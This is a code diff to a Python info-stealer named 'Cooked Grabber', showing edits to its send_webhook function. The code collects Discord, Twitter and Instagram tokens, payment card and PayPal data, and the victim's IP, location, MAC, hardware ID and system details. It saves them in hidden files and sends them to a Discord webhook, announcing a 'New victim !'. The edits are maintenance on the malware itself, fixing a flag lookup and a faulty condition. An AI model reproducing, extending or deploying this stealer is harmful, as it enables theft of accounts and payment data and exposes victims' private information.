@@ -238,7 +238,7 @@ def send_webhook(DISCORD_WEBHOOK_URLs):
             pay_l.append(payment_p.get_string())
     files_names = [["Discord Tokens.txt", discord_T], ["Twitter Tokens.txt", twitter_T], ["Instagram Tokens.txt", insta_T]]
     for x_, y_ in files_names:
-        if (y_ == files_names[0][1] and len(main_info[0])!=0) or (y_ == files_names[1][1] and len(main_info[1])!=0) or (y_ == files_names[2][1] and len(main_info[2])!=0) or (y_ == files_names[3][1] and len(main_info[4])!=0):
+        if (y_ == files_names[0][1] and len(main_info[0])!=0) or (y_ == files_names[1][1] and len(main_info[1])!=0) or (y_ == files_names[2][1] and len(main_info[2])!=0):
             replace_new(x_)
             with open(x_, 'w') as wr:
                 SetFileAttributes(x_, win32con.FILE_ATTRIBUTE_HIDDEN)
@@ -267,7 +267,7 @@ def send_webhook(DISCORD_WEBHOOK_URLs):
         webhook = DiscordWebhook(url=URL, username='Cooked Grabber', avatar_url="https://c.tenor.com/h3fCM442dCcAAAAC/discord-logo.gif")
         embed = DiscordEmbed(title='New victim !', color='00FF00')
         embed.add_embed_field(name='SYSTEM USER INFO', value=f":pushpin:`PC Username:` **{os.getenv('UserName')}**\n:computer:`PC Name:` **{os.getenv('COMPUTERNAME')}**\n:globe_with_meridians:`OS:` **{platform()}**\n", inline=False)
-        embed.add_embed_field(name='IP USER INFO', value=f":eyes:`IP:` **{p_lst[0]}**\n:golf:`Country:` **{p_lst[1]}** :flag_{get('https://restcountries.com/v3/name/morocco').json()[0]['cca2'].lower()}:\n:cityscape:`City:` **{p_lst[2]}**\n:shield:`MAC:` **{gma()}**\n:wrench:`HWID:` **{get_hwid()}**\n", inline=False)
+        embed.add_embed_field(name='IP USER INFO', value=f":eyes:`IP:` **{p_lst[0]}**\n:golf:`Country:` **{p_lst[1]}** :flag_{get(f'https://restcountries.com/v3/name/{p_lst[1]}').json()[0]['cca2'].lower()}:\n:cityscape:`City:` **{p_lst[2]}**\n:shield:`MAC:` **{gma()}**\n:wrench:`HWID:` **{get_hwid()}**\n", inline=False)
         embed.add_embed_field(name='PC USER COMPONENT', value=f":satellite_orbital:`CPU:` **{cpuinfo['brand_raw']} - {round(float(cpuinfo['hz_advertised_friendly'].split(' ')[0]), 2)} GHz**\n:nut_and_bolt:`RAM:` **{round(virtual_memory().total / (1024.0 ** 3), 2)} GB**\n:desktop:`Resolution:` **{GetSystemMetrics(0)}x{GetSystemMetrics(1)}**\n", inline=False)
         embed.add_embed_field(name='ACCOUNT GRABBED', value=f":red_circle:`Discord:` **{len(verified_tokens)}**\n:purple_circle:`Twitter:` **{len(main_info[1])}**\n:blue_circle:`Instagram:` **{len(main_info[2])}**\n", inline=False)
         card_e, paypal_e = ":white_check_mark:" if 'payment_card' in locals() else ":x:", ":white_check_mark:" if 'payment_p' in locals() else ":x:"
@@ -283,7 +283,7 @@ def send_webhook(DISCORD_WEBHOOK_URLs):
 if __name__ == "__main__":
     freeze_support()
     if len(sys.argv) == 1:
-        send_webhook(['YOUR DISCORD WEBHOOK URL'])
+        send_webhook(['YOUR DISCORD WEBHOOK'])
     else:
         del sys.argv[0]
         send_webhook(sys.argv)
